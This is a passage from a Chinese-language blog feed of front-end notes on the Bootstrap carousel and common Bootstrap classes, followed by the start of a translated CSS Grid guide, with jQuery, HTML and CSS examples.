<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">'#myCarousel'</span>).carousel(&#123;  <span class="comment">//设置自定义属性</span></span><br><span class="line">     interval : <span class="number">2000</span>,<span class="comment">//设置自动播放`/2` 秒</span></span><br><span class="line">     pause : <span class="string">'hover'</span>,<span class="comment">//设置暂停按钮的事件</span></span><br><span class="line">     wrap : <span class="literal">false</span>,   <span class="comment">//只播一次</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>方法：</strong>
<ul>
<li><code>cycle</code> 循环各帧(默认从左到右)</li>
<li><code>pause</code> 停止轮播</li>
<li><code>number</code> 轮播到指定的图片上(小标从 <code>0</code> 开始，类似数组)</li>
<li><code>prev</code> 循环轮播到上一个项目</li>
<li><code>next</code> 循环轮播到下一个项目</li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">'button'</span>).on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;<span class="comment">//点击按钮执行</span></span><br><span class="line">     $(<span class="string">'#myCarousel'</span>).carousel(<span class="string">'cycle'</span>); <span class="comment">//点击后，自动播放</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><strong>事件</strong></p>
</li>
<li>
<p><code>slide.bs.carousel</code> 当调用 <code>slide</code> 实例方式时立即触发该事件。</p>
</li>
<li>
<p><code>slid.bs.carousel</code> 当轮播完成一个幻灯片触发该事件</p>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">'#myCarousel'</span>).on(<span class="string">'slide.bs.carousel'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(<span class="string">'当调用 slide 实例方式时立即触发'</span>);</span><br><span class="line">   &#125;);</span><br><span class="line">$(<span class="string">'#myCarousel'</span>).on(<span class="string">'slid.bs.carousel'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">	alert(<span class="string">'当轮播完成一个幻灯片触发'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<ul>
<li>bootstrap笔记总结【复制到浏览器打开放大】<br />
<img src="http://upload-images.jianshu.io/upload_images/1480597-0b43991d33718f5d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="bootstrap笔记总结" /></li>
</ul>
<h4 id="拓展阅读"><a class="markdownIt-Anchor" href="#拓展阅读"></a> 拓展阅读</h4>
<hr />
<ul>
<li><a href="http://v3.bootcss.com/" target="_blank" rel="noopener">bootstrap中文教程</a></li>
<li><a href="https://getbootstrap.com/docs/4.0/examples/" target="_blank" rel="noopener">Examples · Bootstrap-4.0</a></li>
<li><a href="https://hackerthemes.com/bootstrap-cheatsheet/" target="_blank" rel="noopener">bootstrap很方便的速查表-推荐</a></li>
</ul>
]]></content>
      <categories>
        <category>Front-End</category>
        <category>搬运整理</category>
      </categories>
      <tags>
        <tag>Bootstrap</tag>
      </tags>
  </entry>
  <entry>
    <title>bootstrap常用类小结</title>
    <url>/hexolog/post/10fd8090.html</url>
    <content><![CDATA[<h2 id="网格选项"><a class="markdownIt-Anchor" href="#网格选项"></a> 网格选项</h2>
<p><strong><code>row</code>：行</strong></p>
<p><strong><code>col-*-*</code>：列</strong></p>
<ul>
<li>第一个<code>*</code>可以为<code>xs[超小]</code>/<code>sm[小型]</code>/<code>md[中型]</code>/<code>lg[大型]</code></li>
<li>第二个<code>*</code>必须为<code>12</code>以内的[列数]</li>
</ul>
<p><strong><code>col-*-offset-*</code>：列偏移</strong></p>
<ul>
<li>第一个<code>*</code>和上面一样,第二个<code>*</code>范围是<code>1</code>到<code>11</code>,表示把该列的左外边距(<code>margin</code>)增加<code>*</code>列</li>
</ul>
<p><strong><code>col-*-*-*</code>：列排序</strong></p>
<ul>
<li>第一个<code>*</code>和上面一样</li>
<li>第二个<code>*</code>可以为<code>push</code>[向右]/<code>pull</code>[向左]</li>
<li>第三个<code>*</code>范围是<code>1</code>到<code>11</code>[列数]</li>
</ul>
<h2 id="排版"><a class="markdownIt-Anchor" href="#排版"></a> 排版</h2>
<ul>
<li><code>small</code>：内联子标题</li>
<li><code>lead</code>：引导主体副本</li>
</ul>
<p><strong><code>text-*</code>：文本样式</strong></p>
<ul>
<li>
<p><code>*</code>号可以为<br />
<code>left[左对齐]</code>/<code>center[居中对齐]</code>/<code>right[右对齐]</code>/<code>muted[减弱文本]</code><br />
/<code>primary</code>/<code>success</code>/<code>info</code>/<code>warning</code>/<code>danger</code><br />
/<code>justify</code>[自动换行]/<code>nowrap</code>[不换行]<br />
/<code>lowercase</code>[小写]/<code>uppercase</code>[大写]/<code>capitalize</code>[首字母大写]</p>
</li>
<li>
<p><code>list-inline</code>：列表置于同一行</p>
</li>
</ul>
<h2 id="表格"><a class="markdownIt-Anchor" href="#表格"></a> 表格</h2>
<ul>
<li>
<p><strong>table</strong>：基本样式(只有横向分隔线)</p>
</li>
<li>
<p><code>table-*</code>：表格样式</p>
<ul>
<li><code>*</code>可以为<code>striped[添加条纹]</code>/<code>bordered[添加边框]</code>/<code>hover[启用悬停]</code>/<code>condensed[更加紧凑]</code></li>
</ul>
</li>
<li>
<p><strong>tr/th/td 有</strong></p>
<ul>
<li><code>active</code>/<code>success</code>/<code>info</code>/<code>warning</code>/<code>danger</code>来改变背景颜色</li>
</ul>
</li>
<li>
<p><strong>将任意的table放在table-responsive内,实现响应式表格</strong></p>
</li>
</ul>
<blockquote>
<p><code>bootstrap</code>里<code>active</code>/<code>success</code>/<code>info</code>/<code>warning</code>/<code>danger</code>对应的背景颜色</p>
</blockquote>
<p><img src="http://img.blog.csdn.net/20160530130233175" alt="" /></p>
<h2 id="表单"><a class="markdownIt-Anchor" href="#表单"></a> 表单</h2>
<p><strong>创建基本表单(垂直表单)的步骤</strong></p>
<ul>
<li>向父 <code>&lt;form&gt;</code> 元素添加 <code>role=&quot;form&quot;</code></li>
<li>把标签和控件放在一个带有 <code>.form-group</code> 的 <code>&lt;div&gt;</code> 中。这是获取最佳间距所必需的</li>
<li>向所有的文本元素 <code>&lt;input&gt;</code>、<code>&lt;textarea&gt;</code> 和 <code>&lt;select&gt;</code> 添加 <code>.form-control</code></li>
</ul>
<p><strong>创建水平表单的步骤</strong></p>
<ul>
<li>向父 <code>&lt;form&gt;</code> 元素添加  <code>.form-horizontal</code></li>
<li>把标签和控件放在一个带有 <code>.form-group</code> 的 <code>&lt;div&gt;</code> 中</li>
<li>向标签添加 <code>.control-label</code></li>
</ul>
<p><strong>常见的表单控件主要是</strong></p>
<blockquote>
<ul>
<li><code>input</code>、<code>textarea</code>、<code>checkbox</code>、<code>radio</code> 和 <code>select</code></li>
<li><code>input</code>: 声明<code>type</code>有<code>text</code>、<code>password</code>、<code>datetime</code>、<code>datetime-local</code>、<code>date</code>、<code>month</code>、<code>time</code>、<code>week</code>、 <code>number</code>、<code>email</code>、<code>url</code>、<code>search</code>、<code>tel</code> 和 <code>color</code></li>
</ul>
</blockquote>
<ul>
<li>对父元素添加验证状态<code>has-*:</code>验证样式(<code>*</code>可以为<code>warning</code>/<code>error</code>/<code>success</code>)</li>
</ul>
<h2 id="按钮"><a class="markdownIt-Anchor" href="#按钮"></a> 按钮</h2>
<ul>
<li>
<p><strong>btn：基本样式</strong></p>
</li>
<li>
<p><strong><code>btn-*</code></strong>：其他样式</p>
<ul>
<li><code>*</code>可以为<code>default</code>/<code>primary</code>/<code>success</code>/<code>info</code>/<code>warning</code>/<code>danger</code><br />
/<code>link</code>[让按钮看起来像个链接]/<code>lg</code>/<code>sm</code>/<code>xs</code>/<code>block</code>[块级按钮,拉伸至父元素100%的宽度]/<code>active</code>/<code>disabled</code></li>
</ul>
</li>
</ul>
<h2 id="图片"><a class="markdownIt-Anchor" href="#图片"></a> 图片</h2>
<ul>
<li><code>img-*</code>：图片样式(<code>*</code>可以为<code>rounded[圆角6px]</code><br />
/<code>circle[圆形]</code><br />
/<code>thumbnail</code>[添加内边距和一个灰色的边框]/<code>responsive</code>)</li>
</ul>
<h2 id="辅助类"><a class="markdownIt-Anchor" href="#辅助类"></a> 辅助类</h2>
<blockquote>
<p><code>Bootstrap</code>里的一些辅助类,除了上面的<code>active</code>/<code>success</code>/<code>info</code>/<code>warning</code>/<code>danger</code> 还有</p>
</blockquote>
<ul>
<li>
<p><code>pull-left</code>/<code>right</code> 元素浮动到左边/右边</p>
</li>
<li>
<p><code>center-block</code> 设置元素为 <code>display:block</code> 并居中显示</p>
</li>
<li>
<p><code>clearfix</code> 清除浮动</p>
</li>
<li>
<p><code>show</code>/<code>hidden</code> 强制显示/隐藏</p>
</li>
<li>
<p><code>close</code> 显示关闭按钮</p>
</li>
<li>
<p><code>caret</code> 显示下拉式功能</p>
</li>
<li>
<p><code>divider</code> 分隔线</p>
</li>
</ul>
<h2 id="字体图标"><a class="markdownIt-Anchor" href="#字体图标"></a> 字体图标</h2>
<blockquote>
<p>在 <code>fonts</code> 文件夹内可以找到字体图标，它包含了下列这些文件</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">glyphicons-halflings-regular.eot</span><br><span class="line">glyphicons-halflings-regular.svg</span><br><span class="line">glyphicons-halflings-regular.ttf</span><br><span class="line">glyphicons-halflings-regular.woff</span><br></pre></td></tr></table></figure>
<ul>
<li>图标参考：<a href="http://www.runoob.com/bootstrap/bootstrap-glyphicons.html" target="_blank" rel="noopener">http://www.runoob.com/bootstrap/bootstrap-glyphicons.html</a></li>
</ul>
<h2 id="下拉菜单"><a class="markdownIt-Anchor" href="#下拉菜单"></a> 下拉菜单</h2>
<ul>
<li>
<p><code>dropdown</code>：下拉菜单</p>
</li>
<li>
<p><code>dropdown-menu</code>： 下拉菜单</p>
</li>
<li>
<p><code>dropdown-header</code>：下拉菜单区域标题</p>
</li>
</ul>
<h2 id="按钮组"><a class="markdownIt-Anchor" href="#按钮组"></a> 按钮组</h2>
<ul>
<li>
<p><code>btn-group</code>：里面放置一系列<code>btn</code></p>
</li>
<li>
<p><code>btn-toolbar</code>：里面放置几组<code>btn-group</code></p>
</li>
<li>
<p><code>btn-group-*</code>：调整按钮组的样式(<code>*</code>可以为<code>xs</code>/<code>sm</code>/<code>lg</code>/<code>vertical</code>)</p>
</li>
<li>
<p><code>.btn-group</code> 容器添加 <code>.dropup</code>实现按钮上拉菜单</p>
</li>
</ul>
<h2 id="输入框组"><a class="markdownIt-Anchor" href="#输入框组"></a> 输入框组</h2>
<p><strong>向 .form-control 添加前缀或后缀元素的步骤</strong></p>
<ul>
<li>把前缀或后缀元素放在一个带有 <code>.input-group</code> 的 <code>&lt;div&gt;</code>中</li>
<li>接着，在相同的 <code>&lt;div&gt;</code> 内，在 <code>class</code> 为 <code>.input-group-addon</code> 的 <code>&lt;span&gt;</code> 内放置额外的内容</li>
<li>把该 <code>&lt;span&gt;</code> 放置在 <code>&lt;input&gt;</code> 元素的前面或者后面</li>
</ul>
<h2 id="导航元素"><a class="markdownIt-Anchor" href="#导航元素"></a> 导航元素</h2>
<ul>
<li><code>nav nav-tabs</code> ：标签式的导航菜单</li>
<li><code>nav nav-pills</code>：胶囊式的导航菜单</li>
</ul>
]]></content>
      <categories>
        <category>Front-End</category>
        <category>搬运整理</category>
      </categories>
      <tags>
        <tag>Bootstrap</tag>
      </tags>
  </entry>
  <entry>
    <title>css grid 网格布局完整介绍</title>
    <url>/hexolog/post/30c1a0ec.html</url>
    <content><![CDATA[<blockquote>
<p>英文原文：<a href="https://css-tricks.com/snippets/css/complete-guide-grid/" target="_blank" rel="noopener">A Complete Guide to Grid</a>,感谢<a href="https://github.com/zhaozhiming" target="_blank" rel="noopener">zhaozhiming</a>的翻译。</p>
</blockquote>
<h2 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h2>
<p>CSS Grid 布局（又叫“Grid”），是一个基于网格的二维布局系统，目的是为了完全改变我们基于网格设计用户界面的方式。CSS 可以用来做我们的网页布局，但它在这一方面做的不是很好。开始的时候我们使用<code>tables</code>, 然后使用<code>floats</code>，<code>positioning</code>和<code>inline-block</code>，但这些方法本质上都是 hack 的方法并缺少一些重要功能（比如<code>垂直居中</code>）。<code>Flexbox</code>帮助我们解决了问题，但它是简单的一维布局，而不是复杂的二维布局（实际上 Flexbox 和 Grid 可以很好地组合起来使用）。Grid 是第一个专门为了解决那些我们一直使用 hack 手段而导致的页面布局问题而创建的 CSS 模块。</p>
<a id="more"></a>
<p>我写这篇文章主要收到两个事情启发，第一个是<code>Rachel Andrew</code>写的一本好书——《<a href="http://abookapart.com/products/get-ready-for-css-grid-layout" target="_blank" rel="noopener">Get Ready for CSS Grid Layout</a>》，这本书把对 Grid 全面而清晰的介绍作为全书的基调，我高度推荐大家去买这本书来读一下。我另外一件受启发的事情是<code>Chris Coyier</code>对 <a href="https://css-tricks.com/snippets/css/a-guide-to-flexbox/" target="_blank" rel="noopener">Flexbox 的完整介绍</a>，这是我推荐学习 flexbox 的首选资源，它帮助了很多人，当你用 Google 搜索 flexbox 时可以从它的搜索结果看出其影响范围。你可以看到那篇文章跟我的文章有很多相似的地方，因为我这篇文章就是通过模仿那篇最好的文章来写的。（译者注：可以看到这两篇文章都是按照两列分布的方式来介绍 flexbox 和 Grid。）</p>
<p>我这篇文章的目的是为了介绍 Grid 在最新规范中的概念，所以我不会涵盖过时的 IE 语法，并且当规范更新时我将尽力更新这篇文章。</p>
<h2 id="基础和浏览器支持"><a class="markdownIt-Anchor" href="#基础和浏览器支持"></a> 基础和浏览器支持</h2>
<p>开始使用 Grid 非常简单，你只需要通过<code>display: grid</code>来定义一个容器元素作为网格，再通过<code>grid-template-columns</code>和<code>grid-templaet-rows</code>设置列和行的大小，然后通过<code>grid-column</code>和<code>grid-row</code>来设置网格的子元素，grid 元素的顺序对其实现的效果没有任何影响。你的 CSS 可以任意调节它们的顺序，这可以让你很方便地在媒体查询中重新编排你的网格。想象一下在你的整个页面中定义了一个布局，然后通过几行 CSS 代码就可以重新编排出另外一个布局来适应另外一个屏幕，所以说 Grid 是有史以来最强大一个的 CSS 模块。</p>
<p><s>理解 Grid 最重要的一件事情是现在还不能把它用在生产环境。它现在还只是一个 W3C 的在制品草稿，还没有任何浏览器默认是支持它的。IE10 和 11 可以支持它，但它们是用过时的语法做的一个老旧的实现。最好地使用 Grid 的方式是设置 Chrome，Opera 或者 Firefox 的特殊标志来启用它。在 Chrome 中，在地址栏输入<code>chrome://flags</code>然后将<code>experimental web platform features</code>选项设置为<code>enable</code>，这个方法同样适用于 Opera(<code>opera://flags</code>)，在 Firefox 中，将<code>layout.css.grid</code>选项设置为可用。</s></p>
<p>截至2017年3月，许多浏览器都提供了原生的、无需前缀的CSS Grid支持：Chrome（包括Android），Firefox，Safari（包括iOS）、Opera 和 Edge。另一方面，Internet Explorer 10和11支持它，但是它用的是一个过时的语法实现的。</p>
<p>这是一个支持的浏览器表格，详情见<a href="https://caniuse.com/#search=CSS%20grid%20layout" target="_blank" rel="noopener">caniuse.com</a>：</p>
<table class="browser-support-table">
<thead>
<tr>
<th class="chrome"><span>Chrome</span></th>
<th class="safari"><span>Safari</span></th>
<th class="firefox"><span>Firefox</span></th>
<th class="opera"><span>Opera</span></th>
<th class="ie"><span>IE</span></th>
<th class="android"><span>Android</span></th>
<th class="iOS"><span>iOS</span></th>
</tr>
</thead>
<tbody>
<tr>
<td class="yep" data-browser-name="Chrome">29+ (Behind flag)</td>
<td class="nope" data-browser-name="Safari">10.1+</td>
<td class="yep" data-browser-name="Firefox">40+ (Behind flag)</td>
<td class="yep" data-browser-name="Opera">28+ (Behind flag)</td>
<td class="yep" data-browser-name="IE">10+ (Old syntax)</td>
<td class="nope" data-browser-name="Android">62+</td>
<td class="nope" data-browser-name="iOS">10.3+</td>
</tr>
</tbody>
</table>
<p><s>除了微软，其他浏览器好像不想太早实现 Grid 直到规范完全成熟为止，这是一件好事，这意味着我们不用担心以后使用 Grid 要使用多种语法。<br />
在生产环境使用 Grid 只是时间上的问题，但现在是时候可以学习它了。</s></p>
<h2 id="重要的术语"><a class="markdownIt-Anchor" href="#重要的术语"></a> 重要的术语</h2>
<p>在开始了解 Grid 的概念之前先理解其相关的术语是很重要的，因为这里涉及的概念都有点相似，所以如果你不记住它们在规范中的定义的话会很容易被搞混，但请不用担心，这里的术语并不多。</p>
<img src="http://opifddwc7.bkt.clouddn.com/18-1-29/24226299.jpg" class="">
<h3 id="网格容器grid-container"><a class="markdownIt-Anchor" href="#网格容器grid-container"></a> 网格容器（grid container）</h3>
<p>网格容器是指这个元素使用了<code>display: grid</code>，它是所有网格元素的直接父级，在这个例子<code>container</code>的元素就是网格容器。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item item-1"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item item-2"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item item-3"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="网格项grid-item"><a class="markdownIt-Anchor" href="#网格项grid-item"></a> 网格项（grid item）</h3>
<p>网格项是指网格容器的子元素（比如其直接后代），在下面的例子中<code>item</code>的元素是网格项，但<code>sub-item</code>的元素不是。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"sub-item"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="网格线grid-line"><a class="markdownIt-Anchor" href="#网格线grid-line"></a> 网格线（grid line）</h3>
<p>分隔的线组成了网格的结构。它们可以是垂直的（“列网格线”）或者水平的（“行网格线”），也可以在行或列的任一边。下面的例子中黄色的线是一个列网格线的例子。</p>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-line.png" class="">
<h3 id="网格轨道grid-track"><a class="markdownIt-Anchor" href="#网格轨道grid-track"></a> 网格轨道（grid track）</h3>
<p>网格轨道是指两根毗邻网格线中间的位置，你可以认为是网格的行或者列。下面例子的中网格轨道是第二和第三行网格线中间的位置。</p>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-track.png" class="">
<h3 id="网格单元grid-cell"><a class="markdownIt-Anchor" href="#网格单元grid-cell"></a> 网格单元（grid cell）</h3>
<p>网格单元是指两根毗邻的行网格线和列网格线中间的位置，它是一个单独的网格“单元”，下面的例子中网格单元是指第 1 和 2 根行网格线和第 2 和 3 根列网格线中间的位置。</p>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-cell.png" class="">
<h3 id="网格区域grid-area"><a class="markdownIt-Anchor" href="#网格区域grid-area"></a> 网格区域（grid area）</h3>
<p>网格区域是指 4 根网格线包围的空间，一个网格空间可能由任意数量的网格单元构成。下面的例子中网格区域是指在第 1 和 3 的行网格线和第 1 和 3 列网格线中间的位置。</p>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-area.png" class="">
<h2 id="网格容器的属性"><a class="markdownIt-Anchor" href="#网格容器的属性"></a> 网格容器的属性</h2>
<ul>
<li><a href="#display">display</a></li>
<li><a href="#grid-template-columns%E4%B8%8Egrid-template-rows">grid-template-columns</a></li>
<li><a href="#grid-template-columns%E4%B8%8Egrid-template-rows">grid-template-rows</a></li>
<li><a href="#grid-template-areas">grid-template-areas</a></li>
<li><a href="#grid-column-gap">grid-column-gap</a></li>
<li><a href="#grid-row-gap">grid-row-gap</a></li>
<li><a href="#grid-gap">grid-gap</a></li>
<li><a href="#justify-items">justify-items</a></li>
<li><a href="#align-items">align-items</a></li>
<li><a href="#justify-content">justify-content</a></li>
<li><a href="#align-content">align-content</a></li>
<li><a href="#grid-auto-columns">grid-auto-columns</a></li>
<li><a href="#grid-auto-rows">grid-auto-rows</a></li>
<li><a href="#grid-auto-flow">grid-auto-flow</a></li>
<li><a href="#grid">grid</a></li>
</ul>
<h3 id="display"><a class="markdownIt-Anchor" href="#display"></a> display</h3>
<p>定义一个元素为网格容器并为其内容创建一个新的网格格式环境。</p>
<p>值有：</p>
<ul>
<li><strong>grid</strong> - 生成一个块级别的网格</li>
<li><strong>inline-grid</strong> - 生成一个内联级别的网格</li>
<li><strong>subgrid</strong> - 如果你的网格容器是它自己的一个网格子项（比如内嵌的网格），你可以使用这个属性来表示你想要从其父级来获取行和列的大小而不是自己来指定它们。</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>: grid | inline-grid | subgrid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意：<code>column</code>, <code>float</code>, <code>clear</code>和<code>vertical-align</code>对网格容器没有效果。</p>
<h3 id="grid-template-columns与grid-template-rows"><a class="markdownIt-Anchor" href="#grid-template-columns与grid-template-rows"></a> grid-template-columns与grid-template-rows</h3>
<p>通过空格分隔的一系列值来定义网格的行和列，这些值相当于轨迹大小，它们之间的距离相当于网格线。</p>
<p>值有：</p>
<ul>
<li><strong>&lt;track-size&gt;</strong> - 可以是一个长度，百分比或者是网格中自由空间的份数（使用<code>fr</code>这个单位）</li>
<li><strong>&lt;line-name&gt;</strong> - 一个你选择的任意名字</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: &lt;track-size&gt; ... | &lt;line-name&gt; &lt;track-size&gt; ...;</span><br><span class="line">  <span class="attribute">grid-template-rows</span>: &lt;track-size&gt; ... | &lt;line-name&gt; &lt;track-size&gt; ...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>举例：</p>
<p>当你在轨迹值中间留空格，网格线将被自动以数字命名：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="number">40px</span> <span class="number">50px</span> auto <span class="number">50px</span> <span class="number">40px</span>;</span><br><span class="line">  <span class="attribute">grid-template-rows</span>: <span class="number">25%</span> <span class="number">100px</span> auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-numbers.png" class="">
<p>但你可以给网格线指定一个名字，注意网格线命名时的中括号语法：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: [first] <span class="number">40px</span> [line2] <span class="number">50px</span> [line3] auto [col4-start] <span class="number">50px</span> [five] <span class="number">40px</span> [end];</span><br><span class="line">  <span class="attribute">grid-template-rows</span>: [row1-start] <span class="number">25%</span> [row1-end] <span class="number">100px</span> [third-line] auto [last-line];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-names.png" class="">
<p>注意一根网格线可以有多个名字，例如在下面的例子中第二根线有两个名字：<code>row1-end</code> 和 <code>row2-start</code>。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">grid-template-rows</span>: [row1-start] <span class="number">25%</span> [row1-end row2-start] <span class="number">25%</span> [row2-end];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果你定义了容器的重复部分，你可以使用<code>repeat()</code>方法来生成多个相同值：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="built_in">repeat</span>(<span class="number">3</span>, <span class="number">20px</span> [col-start]) <span class="number">5%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>它等价于：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="number">20px</span> [col-start] <span class="number">20px</span> [col-start] <span class="number">20px</span> [col-start] <span class="number">5%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>fr</code>单位允许你将网格容器中的自由空间设置为一个份数，举个例子，下面的例子将把网格容器的每个子项设置为三分之一。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="number">1</span>fr <span class="number">1</span>fr <span class="number">1</span>fr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>自由空间是在所有固定项确定后开始计算的，在下面的例子中自由空间是<code>fr</code>单位的总和但不包括<code>50px</code>：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="number">1</span>fr <span class="number">50px</span> <span class="number">1</span>fr <span class="number">1</span>fr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="grid-template-areas"><a class="markdownIt-Anchor" href="#grid-template-areas"></a> grid-template-areas</h3>
<p>通过引用在<code>grid-area</code>属性中指定的网格区域名字来定义网格模板。重复网格区域的名字将让内容跨越那些单元。一个句点表示一个空单元，语法本身提供了一个可视化的结构网格。</p>
<p>值有：</p>
<ul>
<li><strong>&lt;grid-area-name&gt;</strong> - 在<code>grid-area</code>中指定的网格区域名字</li>
<li><strong>.</strong> - 一个句点表示一个空的网格单元</li>
<li><strong>none</strong> - 没有网格区域被定义</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">grid-template-areas</span>: <span class="string">"&lt;grid-area-name&gt; | . | none | ..."</span></span><br><span class="line">                       <span class="string">"..."</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>举个例子：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item-a</span>&#123;</span><br><span class="line">  <span class="attribute">grid-area</span>: header;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.item-b</span>&#123;</span><br><span class="line">  <span class="attribute">grid-area</span>: main;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.item-c</span>&#123;</span><br><span class="line">  <span class="attribute">grid-area</span>: sidebar;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.item-d</span>&#123;</span><br><span class="line">  <span class="attribute">grid-area</span>: footer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="number">50px</span> <span class="number">50px</span> <span class="number">50px</span> <span class="number">50px</span>;</span><br><span class="line">  <span class="attribute">grid-template-rows</span>: auto;</span><br><span class="line">  <span class="attribute">grid-template-areas</span>: <span class="string">"header header header header"</span></span><br><span class="line">                       <span class="string">"main main . sidebar"</span></span><br><span class="line">                       <span class="string">"footer footer footer footer"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这将创建一个 4 乘以 3 的网格，第一行由<code>header</code>区域组成，中间一行由 2 个<code>main</code>区域和一个空单元和一个<code>sidebar</code>区域组成，最后一行由<code>footer</code>区域组成。</p>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-template-areas.png" class="">
<p>在你定义的每一行都需要拥有相同的单元格。</p>
<p>你可以使用任意毗邻的阶段来声明一个单独的空单元，只要这些阶段中间没有空间都可以认为是一个单独的单元。</p>
<p>注意，在这里你的语法只是命名了区域但没有对网格线进行命名，当你使这种语法时，区域任意一边的线会被自动命名。如果你的网格区域的名字是<code>foo</code>，然么网格的开始行和开始列网格线的名字将会是<code>foo-start</code>，并且它的最后一行和最后一列的网格线名字是<code>foo-end</code>。这意味着一些网格线可能有多个名字，比如上面那个例子中最左边的线，它会有三个名字分别是：<code>header-start</code>，<code>main-start</code>，<code>footer-start</code>。</p>
<h3 id="grid-column-gap"><a class="markdownIt-Anchor" href="#grid-column-gap"></a> grid-column-gap</h3>
<h3 id="grid-row-gap"><a class="markdownIt-Anchor" href="#grid-row-gap"></a> grid-row-gap</h3>
